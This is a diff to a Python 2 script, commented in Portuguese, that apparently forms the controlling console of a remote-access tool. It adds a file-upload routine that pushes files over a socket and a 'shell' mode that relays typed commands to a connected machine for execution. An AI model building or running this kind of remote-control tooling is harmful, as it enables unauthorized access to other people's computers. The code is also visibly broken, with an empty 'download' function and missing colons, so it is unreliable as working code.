@@ -37,14 +37,32 @@ def upload(s, caminho_arquivo=False):
     retorno = retorno.replace('\n','')
     caminho_arq = retorno.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
     if(os.path.isfile(retorno)):
+        print('Enviando arquivo: '+ nome_arquivo)
         s.send(nome_arquivo)
         f = open(caminho_arq,'rb')
         l = f.read(1024)
         while(l):
             s.send(l)
             l = f.read(1024)
+        print('Envio completo ...')
+    else:
+        print('Arquivo inválido ou não é arquivo')
+        return
 
-def identifica(comando, s):
+def download(s):
+
+def shell(s):
+    while True:
+        try:
+            s.send('shell')
+            executar = raw_input('~> ')
+            s.send(executar)
+            if(executar == '/exit'):
+                break
+        except KeyboardInterrupt:
+            break
+
+def identificador(comando, s):
     comando = comando.split(' ')
     tam = len(comando)
     if(tam>1):
@@ -52,12 +70,12 @@ def identifica(comando, s):
     else:
         if(comando[0]=='upload')
             upload(s)
-            comando = ' '.join(comando)
-            conexao.send(comando)
-        elif(comando=='shell'):
-            pass'
+        elif(comando[0]=='shell'):
+            shell(s)
+        elif(comando[0]=='help'):
+            pass
         else:
-            print('{0}Comando errado ou não existe, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
+            print('{0}Comando errado, digite {1}HELP{2} para obter ajuda dos comandos').format(END, RED, END)
 
 def conecta(meuIP):
     while True:
@@ -73,7 +91,7 @@ def conecta(meuIP):
         while True:
             try:
                 comando = raw_input('\033[0m-> ')
-                identifica(comando, conexao)
+                identificador(comando, conexao)
                 recebido = conexao.recv(1024)
                 print(recebido)
             except socket.error as e:
